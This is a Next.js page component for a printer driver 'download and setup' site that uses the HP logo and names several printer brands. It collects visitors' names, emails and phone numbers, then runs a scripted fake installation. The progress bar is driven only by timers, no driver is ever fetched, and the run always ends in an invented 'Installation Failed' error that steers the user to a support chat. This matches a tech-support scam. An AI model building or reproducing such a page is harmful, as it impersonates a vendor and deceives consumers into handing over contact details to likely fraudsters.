"use client";


import Link from "next/link";
import { useEffect, useMemo, useState } from "react";
import {
    FaComments,
    FaSearch,
    FaCheckCircle,
    FaDownload,
    FaCog,
    FaWifi,
    FaClock,
    FaCheck,
    FaTerminal,
    FaExclamationTriangle,
    FaRedo,
    FaPhone,
    FaTimes,
    FaFacebookF,
    FaTwitter,
    FaLinkedinIn,
    FaInstagram,
    FaPrint,
    FaUser,
    FaEnvelope,
    FaTag,
    FaRocket,
    FaBook,
    FaTools,
    FaSpinner,
} from "react-icons/fa";
import { RxCross2 } from "react-icons/rx";


export default function SetupPage() {
    const [isSetupOpen, setIsSetupOpen] = useState(false);
    const [view, setView] = useState("form"); // form | progress | error
    const [progress, setProgress] = useState(0);
    const [stepsState, setStepsState] = useState(
        () => [
            { icon: "clock", text: "Preparing installation environment..." },
            { icon: "download", text: "Fetching latest printer drivers..." },
            { icon: "cog", text: "Setting up printer preferences..." },
            { icon: "wifi", text: "Setting up wireless connection..." },
            { icon: "check", text: "Completing installation..." },
        ]
    );
    const [log, setLog] = useState([]);
    const [form, setForm] = useState({
        name: "",
        email: "",
        phone: "",
        model: "",
        brand: "",
        agreement: false,
    });
    const [errors, setErrors] = useState({});
    const [isSubmitting, setIsSubmitting] = useState(false);

    const steps = useMemo(
        () => [
            { progress: 20, step: 0, message: "Initializing setup environment...", log: "Starting printer setup process" },
            { progress: 40, step: 1, message: "Downloading latest drivers...", log: "Downloading drivers from manufacturer server" },
            { progress: 60, step: 2, message: "Configuring printer settings...", log: "Setting up printer preferences and options" },
            { progress: 80, step: 3, message: "Configuring network settings...", log: "Setting up wireless connection" },
            { progress: 100, step: 4, message: "Finalizing installation...", log: "Completing setup process" },
        ],
        []
    );

    useEffect(() => {
        // Equivalent to DOMContentLoaded init logging
        // eslint-disable-next-line no-console
        // console.log("Setup page loaded", { timestamp: new Date().toISOString() });
    }, []);

    function openSetupModal() {
        // eslint-disable-next-line no-console
        // console.log("Setup Modal Opened", {
        //     timestamp: new Date().toISOString(),
        //     userAgent: typeof navigator !== "undefined" ? navigator.userAgent : "",
        // });
        setIsSetupOpen(true);
        setView("form");
        setProgress(0);
        setStepsState([
            { icon: "fa-solid fa-clock", text: "Preparing installation environment..." },
            { icon: "fa-solid fa-download", text: "Fetching latest printer drivers..." },
            { icon: "fa-solid fa-cog", text: "Setting up printer preferences..." },
            { icon: "fa-solid fa-wifi", text: "Setting up wireless connection..." },
            { icon: "fa-solid fa-check", text: "Completing installation..." },
        ]);
        setLog([]);
        setErrors({});
    }

    function closeSetupModal() {
        setIsSetupOpen(false);
    }

    function openChatAndcloseSetupModal(){
        closeSetupModal();
        openChat();
    }

    function updateField(name, value) {
        setForm(prev => ({ ...prev, [name]: value }));
        if (errors[name]) {
            setErrors(prev => ({ ...prev, [name]: undefined }));
        }
    }

    function validate() {
        const nextErrors = {};
        if (!form.name || form.name.trim().length < 2) nextErrors.name = "Name must be at least 2 characters long";
        ["email", "phone", "model"].forEach(k => {
            if (!form[k] || String(form[k]).trim() === "") nextErrors[k] = `${k[0].toUpperCase()}${k.slice(1)} is required`;
        });
        if (!form.agreement) nextErrors.agreement = "Please agree to be contacted by our support team";
        setErrors(nextErrors);
        return Object.keys(nextErrors).length === 0;
    }

    function addLog(message) {
        const timestamp = new Date().toLocaleTimeString();
        setLog(prev => [...prev, `[${timestamp}] ${message}`]);
    }

    function startInstallation() {
        setView("progress");
        setProgress(0);
        setStepsState([
            { icon: "fa-solid fa-clock", text: "Preparing installation environment..." },
            { icon: "fa-solid fa-download", text: "Fetching latest printer drivers..." },
            { icon: "fa-solid fa-cog", text: "Setting up printer preferences..." },
            { icon: "fa-solid fa-wifi", text: "Setting up wireless connection..." },
            { icon: "fa-solid fa-check", text: "Completing installation..." },
        ]);
        addLog("Starting printer setup process");

        let current = 0;
        function runNext() {
            const step = steps[current];
            if (!step) return;
            setProgress(step.progress);
            setStepsState(prev => prev.map((s, i) => (i === step.step ? { ...s, text: step.message, icon: "spinner" } : s)));
            addLog(step.log);

            const atEighty = step.progress === 80;
            current += 1;
            if (atEighty) {
                setTimeout(() => {
                    setView("error");
                }, 2000);
                return;
            }
            setTimeout(() => {
                setStepsState(prev => prev.map((s, i) => (i === step.step ? { ...s, icon: "check", text: step.message.replace("...", " - Completed") } : s)));
                if (current < steps.length) {
                    setTimeout(runNext, 800);
                }
            }, 1000);
        }
        setTimeout(runNext, 2000);
    }

    async function onSubmit(e) {
        e.preventDefault();
        if (!validate()) return;
        try {
            setIsSubmitting(true);
            const res = await fetch("/api/smtp", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    name: form.name,
                    email: form.email,
                    phone: form.phone,
                    model: form.model,
                    brand: form.brand,
                }),
            });
            const data = await res.json();
            if (!res.ok || !data?.ok) {
                setErrors(prev => ({ ...prev, submit: data?.error || "Failed to send setup request" }));
                return;
            }
            startInstallation();
        } catch (err) {
            setErrors(prev => ({ ...prev, submit: err?.message || "Network error" }));
        } finally {
            setIsSubmitting(false);
        }
    }

    function retryInstallation() {
        setView("progress");
        setProgress(0);
        setLog([]);
        startInstallation();
    }

    const openChat = () => {
    if (typeof window !== "undefined" && window.Tawk_API) {
      window.Tawk_API.maximize();
    }
  };


    return (
        <div className="font-inter bg-gradient-to-br from-gray-50 to-blue-50">
            <header className="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur-xl border-b border-white/20 shadow-lg">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="flex justify-between items-center h-16">
                        <Link href="/services"
                        className="flex items-center">
                            <img src="/hplogo.png" alt="HP Logo" className="h-16 w-auto" />
                        </Link>
                        <div className="flex items-center">
                            <button
                                className="px-6 py-2 text-white rounded font-semibold cursor-pointer transition-all duration-300 shadow-lg hover:shadow-xl"
                                style={{ backgroundColor: "#007dbd" }}
                                onMouseOver={e => (e.currentTarget.style.backgroundColor = "#005a8b")}
                                onMouseOut={e => (e.currentTarget.style.backgroundColor = "#007dbd")}
                                onClick={openChat}
                                
                            >
                                <FaComments className="inline-block mr-2" />Chat Now
                            </button>
                        </div>
                    </div>
                </div>
            </header>

            <section
                id="home"
                className="relative h-[60vh] sm:h-[50vh] bg-cover bg-center bg-no-repeat"
                style={{ backgroundImage: "url('/banner.avif')", marginTop: 64 }}
            >
                <div className="absolute inset-0 bg-black/30" />
                <div className="absolute inset-0" style={{ backgroundColor: "rgba(0, 125, 189, 0.2)" }} />
                <div className="relative z-10 h-full flex items-center justify-center">
                    <div className="text-center text-white px-4 sm:px-6 lg:px-8 max-w-4xl mx-auto">
                        <h1 className="text-2xl md:text-4xl font-bold mb-6 drop-shadow-lg">
                            Download & Setup <span className="text-[#007dbd]">Printer</span>
                        </h1>
                        <p className="text-lg md:text-xl mb-8 text-white drop-shadow-md">
                            Expert technical assistance for Printers with instant solutions
                        </p>
                        <div className="flex flex-col sm:flex-row gap-4 justify-center">
                            <button
                                className="px-4 py-1.5 text-white font-semibold cursor-pointer transition-colors shadow-lg"
                                style={{ backgroundColor: "#007dbd" }}
                                onMouseOver={e => (e.currentTarget.style.backgroundColor = "#005a8b")}
                                onMouseOut={e => (e.currentTarget.style.backgroundColor = "#007dbd")}
                                onClick={openSetupModal}
                            >
                                Download Driver
                            </button>
                            <button
                                className="px-4 py-1.5 bg-transparent border-2 border-white cursor-pointer text-white  font-semibold hover:bg-white hover:text-[#007dbd] transition-colors shadow-lg"
                                onClick={openSetupModal}
                            >
                                Setup Printer
                            </button>
                        </div>
                    </div>
                </div>
            </section>

            <section id="brands" className="py-8 sm:py-12 lg:py-16 bg-gradient-to-br from-gray-50 to-blue-50">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="text-center mb-16">
                        <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                            Brand-Specific <span className="text-[#007dbd]">Support</span>
                        </h2>
                        <p className="text-xl text-gray-600 max-w-3xl mx-auto">
                            Expert support for all major printer brands with specialized knowledge and tools
                        </p>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 lg:gap-8 px-16 sm:px-0">
                        {[
                            { src: "/hplogo.png", title: "HP Printers" },
                            { src: "/canonlogo.png", title: "Canon Printers" },
                            { src: "/brotherlogo.jpg", title: "Brother Printers" },
                            { src: "/epsonlogo.png", title: "Epson Printers" },
                        ].map(item => (
                            <div 
                            onClick={openSetupModal}
                            key={item.title} className="brand-card bg-white p-4 sm:p-6 rounded-xl border-2 border-[#007dbd]/20 hover:border-[#007dbd] hover:shadow-xl transition-all cursor-pointer group">
                                <div className="text-center">
                                    <div className="w-16 h-16 sm:w-20 sm:h-20 lg:w-24 lg:h-24 mx-auto flex items-center justify-center mb-3 sm:mb-4">
                                        <img src={item.src} alt={item.title} className="max-w-full max-h-full object-contain group-hover:scale-105 transition-transform" />
                                    </div>
                                    {/* <h3 className="text-lg font-semibold text-gray-900 mb-2">{item.title}</h3> */}
                                    {/* <p className="text-gray-600 text-sm mb-4">Professional support including setup, troubleshooting, and updates.</p> */}
                                    <button
                                        className="text-white px-4 py-2 cursor-pointer rounded text-sm transition-colors"
                                        style={{ backgroundColor: "#007dbd" }}
                                        onMouseOver={e => (e.currentTarget.style.backgroundColor = "#005a8b")}
                                        onMouseOut={e => (e.currentTarget.style.backgroundColor = "#007dbd")}
                                        
                                    >
                                        Setup Now
                                    </button>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            <section className="py-8 sm:py-12 lg:py-16 bg-white">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="text-center mb-16">
                        <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                            Identify Your <span className="text-[#007dbd]">Printer</span>
                        </h2>
                        <p className="text-xl text-gray-600 max-w-3xl mx-auto">
                            Find manuals, drivers, and specific product information for your printer
                        </p>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 sm:gap-10 lg:gap-12 items-center">
                        <div className="text-center lg:text-left order-2 lg:order-1">
                            <div className="relative py-4 sm:py-6">
                                <img src="/NSLaser.avif" alt="Printer Identification" className="w-full max-w-xs sm:max-w-sm lg:max-w-md mx-auto rounded-xl shadow-lg" />
                                <img src="/Laserjet.avif" alt="Printer Identification" className="w-full max-w-xs sm:max-w-sm lg:max-w-md mx-auto rounded-xl shadow-lg mt-2 sm:mt-3" />
                                <div className="absolute inset-0 bg-[#007dbd]/10 rounded-xl" />
                            </div>
                        </div>

                        <div className="space-y-6 sm:space-y-8 order-1 lg:order-2">
                            <div className="bg-gradient-to-r from-[#007dbd]/5 to-[#007dbd]/10 p-4 sm:p-6 rounded-xl border border-[#007dbd]/20">
                                <h3 className="text-lg sm:text-xl font-semibold text-gray-900 mb-3 sm:mb-4 flex items-center">
                                    <FaSearch className="inline-block text-[#007dbd] mr-2 sm:mr-3 text-sm sm:text-base" />
                                    How to Identify Your Printer
                                </h3>
                                <ul className="space-y-2 sm:space-y-3 text-gray-700 text-sm sm:text-base">
                                    {[
                                        "Check the product label on the front or back of your printer",
                                        "Look for the model number (e.g., LaserJet Pro, PIXMA, WorkForce)",
                                        "Check the printer's control panel or settings menu",
                                        "Use manufacturer's app to automatically detect your printer",
                                    ].map(t => (
                                        <li key={t} className="flex items-start">
                                            <FaCheckCircle className="text-[#007dbd] mr-2 sm:mr-3 mt-1 text-xs sm:text-sm flex-shrink-0" />
                                            <span>{t}</span>
                                        </li>
                                    ))}
                                </ul>
                            </div>

                            <div className="bg-white p-4 sm:p-6 rounded-xl border-2 border-[#007dbd]/20 shadow-lg">
                                <h4 className="text-lg font-semibold text-gray-900 mb-4">Search for Your Printer</h4>
                                <div className="flex flex-col sm:flex-row gap-3">
                                    <input
                                        type="text"
                                        placeholder="Enter printer model (e.g., LaserJet Pro M404n, PIXMA TR4520)"
                                        className="flex-1 px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#007dbd] focus:border-[#007dbd] outline-none"
                                    />
                                    <button
                                        className="w-full sm:w-auto px-6 py-3 text-white cursor-pointer rounded-lg font-semibold transition-colors"
                                        style={{ backgroundColor: "#007dbd" }}
                                        onMouseOver={e => (e.currentTarget.style.backgroundColor = "#005a8b")}
                                        onMouseOut={e => (e.currentTarget.style.backgroundColor = "#007dbd")}
                                        onClick={openSetupModal}
                                    >
                                        <FaSearch className="inline-block mr-2" />Search
                                    </button>
                                </div>
                            </div>

                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                                {[
                                    { title: "User Manuals", icon: "book" },
                                    { title: "Drivers & Software", icon: "download" },
                                    { title: "Troubleshooting", icon: "tools" },
                                    { title: "Setup & Install", icon: "cog" },
                                ].map(s => (
                                    <div key={s.title} className="flex items-center p-4 bg-gray-50 hover:bg-[#007dbd]/5 rounded-lg transition-colors group cursor-pointer" onClick={openSetupModal}>
                                        {s.icon === "book" ? (
                                            <FaBook className="text-[#007dbd] mr-3 group-hover:scale-110 transition-transform" />
                                        ) : s.icon === "download" ? (
                                            <FaDownload className="text-[#007dbd] mr-3 group-hover:scale-110 transition-transform" />
                                        ) : s.icon === "tools" ? (
                                            <FaTools className="text-[#007dbd] mr-3 group-hover:scale-110 transition-transform" />
                                        ) : (
                                            <FaCog className="text-[#007dbd] mr-3 group-hover:scale-110 transition-transform" />
                                        )}
                                        <div>
                                            <h5 className="font-semibold text-gray-900">{s.title}</h5>
                                            <p className="text-sm text-gray-600">{s.title === "User Manuals" ? "Download PDF manuals" : s.title === "Drivers & Software" ? "Latest drivers" : s.title === "Troubleshooting" ? "Fix common issues" : "Installation guides"}</p>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <footer className="bg-gray-900 text-white pt-8 sm:pt-8 lg:pt-10 pb-4 sm:pb-4 lg:pb-6">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 sm:gap-8">
                        <div className="sm:col-span-2 lg:col-span-1">
                            {/* <Link href="/setup"
                        className="flex items-center">
                            <img src="/hplogo.png" alt="HP Logo" className="h-16 w-auto" />
                        </Link> */}
                            <p className="text-gray-400 mb-4 text-sm sm:text-base leading-relaxed">Professional Printer Download Driver & Setup Solutions with 24/7 expert assistance for all your printing needs.</p>
                            <div className="flex space-x-3 sm:space-x-4">
                                <a href="#" className="text-gray-400 hover:text-white transition-colors text-lg sm:text-xl"><FaFacebookF /></a>
                                <a href="#" className="text-gray-400 hover:text-white transition-colors text-lg sm:text-xl"><FaTwitter /></a>
                                <a href="#" className="text-gray-400 hover:text-white transition-colors text-lg sm:text-xl"><FaLinkedinIn /></a>
                                <a href="#" className="text-gray-400 hover:text-white transition-colors text-lg sm:text-xl"><FaInstagram /></a>
                            </div>
                        </div>
                        <div>
                            <h4 className="text-base sm:text-lg font-semibold mb-3 sm:mb-4">Services</h4>
                            <ul className="space-y-1 sm:space-y-2 text-gray-400 text-sm sm:text-base">
                                {[
                                    "Printer Installation",
                                    "Maintenance & Repair",
                                    "Network Setup",
                                    "Driver Support",
                                    "24/7 Support",
                                ].map(item => (
                                    <li key={item}><a href="#" className="hover:text-white transition-colors">{item}</a></li>
                                ))}
                            </ul>
                        </div>
                        <div>
                            <h4 className="text-base sm:text-lg font-semibold mb-3 sm:mb-4">Support</h4>
                            <ul className="space-y-1 sm:space-y-2 text-gray-400 text-sm sm:text-base">
                                {[
                                    "HP Printers",
                                    "Canon Printers",
                                    "Brother Printers",
                                    "Epson Printers",
                                    "Troubleshooting",
                                ].map(item => (
                                    <li key={item}><a href="#" className="hover:text-white transition-colors">{item}</a></li>
                                ))}
                            </ul>
                        </div>
                    </div>

                    <div className="border-t border-gray-800 mt-3 sm:mt-4 pt-3 sm:pt-4">
                        <div className="flex flex-wrap justify-start gap-1 sm:gap-2 lg:gap-3 text-xs sm:text-sm text-gray-100 mb-3 sm:mb-4">
                            {[
                                "Recalls",
                                "Product recycling",
                                "Accessibility",
                                "CSR Policy",
                                "Entity Annual Return",
                                "Privacy",
                                "Terms of use",
                                "Cookie Preferences",
                            ].map((t, i) => (
                                <div key={i}>
                                    <Link href="#" className="hover:text-white transition-colors">{t}</Link>
                                    {i < 7 ? <span className="text-gray-600 hidden sm:inline">|</span> : null}
                                </div>
                            ))}
                        </div>
                        <div className="text-start text-gray-300 text-xs sm:text-sm">
                            <p>&copy;2025 The information contained herein is subject to change without notice.</p>
                        </div>
                    </div>
                </div>
            </footer>

            {/* Setup Modal */}
            {isSetupOpen && (
                <div className="fixed inset-0 bg-[#17252b75] bg-opacity-50 z-50">
                    <div className="flex items-center justify-center min-h-screen p-2 sm:p-4">
                        <div className="bg-white rounded-lg w-full max-w-sm sm:max-w-md lg:max-w-lg max-h-[90vh] sm:max-h-[80vh] overflow-y-auto">
                            {view === "form" && (
                                <div className="py-4 sm:py-6 lg:py-8 px-4 sm:px-6 lg:px-10">
                                    <div className="flex justify-between items-center mb-4 sm:mb-6">
                                        <div className="flex items-center space-x-2 sm:space-x-3">
                                            <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-lg flex items-center justify-center" style={{ backgroundColor: "#007dbd" }}>
                                                <FaCog className="text-white text-sm sm:text-lg" />
                                            </div>
                                            <div>
                                                <h3 className="text-lg sm:text-xl font-bold text-gray-900">Printer Setup</h3>
                                                <p className="text-gray-600 text-xs sm:text-sm">Professional printer installation service</p>
                                            </div>
                                        </div>
                                        <button onClick={closeSetupModal} className="w-6 h-6 sm:w-8 sm:h-8 text-black bg-gray-100 hover:bg-gray-200 rounded-lg flex items-center justify-center cursor-pointer transition-all duration-300">
                                            <RxCross2 />
                                        </button>
                                    </div>

                                    <form className="space-y-3 sm:space-y-4" onSubmit={onSubmit}>
                                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                                            <div className="form-group">
                                                <label htmlFor="setupName" className="block text-xs sm:text-sm font-semibold text-gray-800 mb-1 sm:mb-2">
                                                    <FaUser className="inline-block mr-1 sm:mr-2 text-xs sm:text-sm" style={{ color: "#007dbd" }} />Full Name
                                                </label>
                                                <input
                                                    id="setupName"
                                                    name="name"
                                                    placeholder="Enter your full name"
                                                    className={`w-full px-2 sm:px-3 py-2 border outline-0 text-gray-700 rounded-lg focus:border-[#007dbd] transition-all duration-300 bg-white text-sm sm:text-base ${errors.name ? "border-red-500" : "border-gray-300"}`}
                                                    value={form.name}
                                                    onChange={e => updateField("name", e.target.value)}
                                                />
                                                {errors.name && <div className="field-error text-red-500 text-sm mt-1">{errors.name}</div>}
                                            </div>
                                            <div className="form-group">
                                                <label htmlFor="setupEmail" className="block text-xs sm:text-sm font-semibold text-gray-800 mb-1 sm:mb-2">
                                                    <FaEnvelope className="inline-block mr-1 sm:mr-2 text-xs sm:text-sm" style={{ color: "#007dbd" }} />Email Address
                                                </label>
                                                <input
                                                    id="setupEmail"
                                                    name="email"
                                                    type="email"
                                                    placeholder="your.email@example.com"
                                                    className={`w-full px-2 sm:px-3 py-2 border rounded-lg text-gray-700 outline-0 focus:border-[#007dbd] transition-all duration-300 bg-white text-sm sm:text-base ${errors.email ? "border-red-500" : "border-gray-300"}`}
                                                    value={form.email}
                                                    onChange={e => updateField("email", e.target.value)}
                                                />
                                                {errors.email && <div className="field-error text-red-500 text-sm mt-1">{errors.email}</div>}
                                            </div>
                                        </div>

                                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                                            <div className="form-group">
                                                <label htmlFor="setupPhone" className="block text-xs sm:text-sm font-semibold text-gray-800 mb-1 sm:mb-2">
                                                    <FaPhone className="inline-block mr-1 sm:mr-2 text-xs sm:text-sm" style={{ color: "#007dbd" }} />Phone Number
                                                </label>
                                                <input
                                                    id="setupPhone"
                                                    name="phone"
                                                    placeholder="+1 (555) 123-4567"
                                                    className={`w-full px-2 sm:px-3 py-2 border rounded-lg text-gray-700 outline-0 focus:border-[#007dbd] transition-all duration-300 bg-white text-sm sm:text-base ${errors.phone ? "border-red-500" : "border-gray-300"}`}
                                                    value={form.phone}
                                                    onChange={e => updateField("phone", e.target.value)}
                                                />
                                                {errors.phone && <div className="field-error text-red-500 text-sm mt-1">{errors.phone}</div>}
                                            </div>
                                            <div className="form-group">
                                                <label htmlFor="setupModel" className="block text-xs sm:text-sm font-semibold text-gray-800 mb-1 sm:mb-2">
                                                    <FaPrint className="inline-block mr-1 sm:mr-2 text-xs sm:text-sm" style={{ color: "#007dbd" }} />Printer Model
                                                </label>
                                                <input
                                                    id="setupModel"
                                                    name="model"
                                                    placeholder="e.g., LaserJet Pro M404n, PIXMA TR4520"
                                                    className={`w-full px-2 sm:px-3 py-2 border rounded-lg outline-0 text-gray-700 focus:border-[#007dbd] transition-all duration-300 bg-white text-sm sm:text-base ${errors.model ? "border-red-500" : "border-gray-300"}`}
                                                    value={form.model}
                                                    onChange={e => updateField("model", e.target.value)}
                                                />
                                                {errors.model && <div className="field-error text-red-500 text-sm mt-1">{errors.model}</div>}
                                            </div>
                                        </div>

                                        <div className="form-group">
                                            <label htmlFor="setupBrand" className="block text-xs sm:text-sm font-semibold text-gray-800 mb-1 sm:mb-2">
                                                <FaTag className="inline-block mr-1 sm:mr-2 text-xs sm:text-sm" style={{ color: "#007dbd" }} />Printer Brand
                                            </label>
                                            <select
                                                id="setupBrand"
                                                name="brand"
                                                className="w-full px-2 sm:px-3 md:py-3 py-2 border border-gray-300  text-gray-700 outline-0 rounded-lg focus:border-[#007dbd] transition-all duration-300 bg-white text-sm sm:text-base"
                                                value={form.brand}
                                                onChange={e => updateField("brand", e.target.value)}
                                            >
                                                <option value="">Select your printer brand</option>
                                                <option value="HP">HP (Hewlett-Packard)</option>
                                                <option value="Canon">Canon</option>
                                                <option value="Epson">Epson</option>
                                                <option value="Brother">Brother</option>
                                                <option value="Other">Other Brand</option>
                                            </select>
                                        </div>

                                        <div className="flex items-start space-x-2 sm:space-x-3 p-2 sm:p-3 rounded-lg border" style={{ backgroundColor: "rgba(0, 125, 189, 0.05)", borderColor: "rgba(0, 125, 189, 0.2)" }}>
                                            <input
                                                id="setupAgreement"
                                                type="checkbox"
                                                className="w-3 h-3 sm:w-4 sm:h-4 border-gray-300 rounded text-gray-700 outline-0 mt-0.5 flex-shrink-0"
                                                checked={form.agreement}
                                                onChange={e => updateField("agreement", e.target.checked)}
                                            />
                                            <label htmlFor="setupAgreement" className="text-xs text-gray-700 leading-relaxed">
                                                I agree to be contacted by our support team for printer setup assistance and understand that my information will be used to provide technical support services.
                                            </label>
                                        </div>
                                        {errors.agreement && <div className="field-error text-red-500 text-sm -mt-2">{errors.agreement}</div>}
                                        {errors.submit && <div className="field-error text-red-500 text-sm">{errors.submit}</div>}

                                        <div className="flex flex-col justify-between items-center pt-2">
                                            {/* <button type="button" onClick={closeSetupModal} disabled={isSubmitting} className="bg-gray-100 text-gray-700 py-2 px-3 sm:px-4 rounded-lg font-semibold hover:bg-gray-200 transition-all duration-300 border border-gray-200 hover:border-gray-300 text-sm sm:text-base disabled:opacity-60 disabled:cursor-not-allowed">
                                                <FaTimes className="inline-block mr-1 sm:mr-2 text-xs sm:text-sm" />Cancel
                                            </button> */}
                                            <button type="submit" disabled={isSubmitting} aria-busy={isSubmitting} className="text-white py-2 px-3 cursor-pointer sm:px-4 rounded-lg font-semibold transition-all duration-300 shadow-lg hover:shadow-xl text-sm sm:text-base disabled:opacity-70 disabled:cursor-wait" style={{ backgroundColor: "#007dbd" }}>
                                                {isSubmitting ? (
                                                    <>
                                                        <FaSpinner className="inline-block mr-2 animate-spin" />Processing...
                                                    </>
                                                ) : (
                                                    <>
                                                        <FaRocket className="inline-block mr-1 sm:mr-2 text-xs sm:text-sm" />Start Setup Process
                                                    </>
                                                )}
                                            </button>
                                        </div>
                                    </form>
                                </div>
                            )}

                            {view === "progress" && (
                                <div className="py-4 sm:py-6 lg:py-8 px-4 sm:px-6 lg:px-10">
                                    <div className="flex justify-between items-center mb-3 sm:mb-4">
                                        <h3 className="text-base sm:text-lg font-semibold text-gray-900">
                                            <i className="fas fa-download mr-2" style={{ color: "#007dbd" }} />Installing Printer Setup
                                        </h3>
                                        <div className="text-xs sm:text-sm text-gray-500"><span>{progress}%</span></div>
                                    </div>
                                    <div className="mb-4 sm:mb-6">
                                        <div className="bg-gray-200 rounded-full h-2 sm:h-3 overflow-hidden">
                                            <div className="h-full rounded-full transition-all duration-500 ease-out" style={{ width: `${progress}%`, background: "linear-gradient(90deg, #007dbd 0%, #005a8b 100%)" }} />
                                        </div>
                                    </div>
                                    <div className="space-y-2 sm:space-y-3">
                                        {stepsState.map((s, i) => (
                                            <div key={i} className="installation-step flex items-center space-x-2 sm:space-x-3 p-2 sm:p-3 rounded border" style={{ borderColor: "rgba(0, 125, 189, 0.2)" }}>
                                                <div className="step-icon w-5 h-5 sm:w-6 sm:h-6 rounded-full flex items-center justify-center flex-shrink-0" style={{ backgroundColor: "rgba(0, 125, 189, 0.1)" }}>
                                                    {s.icon === "spinner" ? (
                                                        <FaSpinner className="animate-spin text-primary" />
                                                    ) : s.icon === "clock" ? (
                                                        <FaClock className="text-gray-500" />
                                                    ) : s.icon === "download" ? (
                                                        <FaDownload className="text-gray-500" />
                                                    ) : s.icon === "cog" ? (
                                                        <FaCog className="text-gray-500" />
                                                    ) : s.icon === "wifi" ? (
                                                        <FaWifi className="text-gray-500" />
                                                    ) : (
                                                        <FaCheck className="text-white" />
                                                    )}
                                                </div>
                                                <div className="flex-1">
                                                    <h4 className="text-xs sm:text-sm font-medium text-gray-900">{s.text.replace(" - Completed", "")}</h4>
                                                    <p className="text-xs text-gray-600">{s.text}</p>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                    <div className="mt-3 sm:mt-4 p-2 sm:p-3 rounded border" style={{ backgroundColor: "rgba(0, 125, 189, 0.05)", borderColor: "rgba(0, 125, 189, 0.2)" }}>
                                        <h4 className="text-xs sm:text-sm font-medium text-gray-900 mb-1 sm:mb-2">
                                            <FaTerminal className="inline-block mr-2 text-xs sm:text-sm" style={{ color: "#007dbd" }} />Installation Log
                                        </h4>
                                        <div className="text-xs text-gray-600 font-mono space-y-1 max-h-24 overflow-y-auto">
                                            {log.map((line, idx) => (
                                                <div key={idx}>{line}</div>
                                            ))}
                                        </div>
                                    </div>
                                </div>
                            )}

                            {view === "error" && (
                                <div className="py-4 sm:py-6 lg:py-8 px-4 sm:px-6 lg:px-10">
                                    <div className="text-center">
                                        <div className="w-12 h-12 sm:w-16 sm:h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
                                            <FaExclamationTriangle className="text-red-600 text-lg sm:text-2xl" />
                                        </div>
                                        <h3 className="text-lg sm:text-xl lg:text-2xl font-semibold text-gray-900 mb-2">Installation Failed</h3>
                                        <p className="text-sm sm:text-base text-gray-600 mb-4 sm:mb-6 px-2">
                                            We encountered an issue during the installation process. Our technical team has been notified and will contact you shortly to resolve this issue.
                                        </p>
                                        <div className="bg-red-50 border border-red-200 rounded-lg p-3 sm:p-4 mb-4 sm:mb-6 text-left">
                                            <h4 className="font-medium text-red-800 mb-2 text-sm sm:text-base">Error Details:</h4>
                                            <p className="text-red-700 text-xs sm:text-sm">
                                                <strong>Error Code:</strong> INST_ERR_001<br />
                                                <strong>Description:</strong> Driver compatibility issue detected<br />
                                                <strong>Time:</strong> {new Date().toLocaleString()}
                                            </p>
                                        </div>
                                        <div className="space-y-2 sm:space-y-3">
                                            <button onClick={retryInstallation} className="w-full bg-[#007dbd] cursor-pointer text-white py-2 sm:py-3 rounded-lg font-semibold hover:bg-secondary transition-colors text-sm sm:text-base">
                                                <FaRedo className="inline-block mr-2 text-xs sm:text-sm" />Retry Installation
                                            </button>
                                            <button onClick={openChatAndcloseSetupModal} className="w-full bg-green-600 cursor-pointer text-white py-2 sm:py-3 rounded-lg font-semibold hover:bg-green-700 transition-colors text-sm sm:text-base">
                                                <FaPhone className="inline-block mr-2 text-xs sm:text-sm" />Contact Support
                                            </button>
                                            <button onClick={closeSetupModal} className="w-full bg-gray-500 cursor-pointer text-white py-2 sm:py-3 rounded-lg font-semibold hover:bg-gray-600 transition-colors text-sm sm:text-base">
                                                <FaTimes className="inline-block mr-2 text-xs sm:text-sm" />Close
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}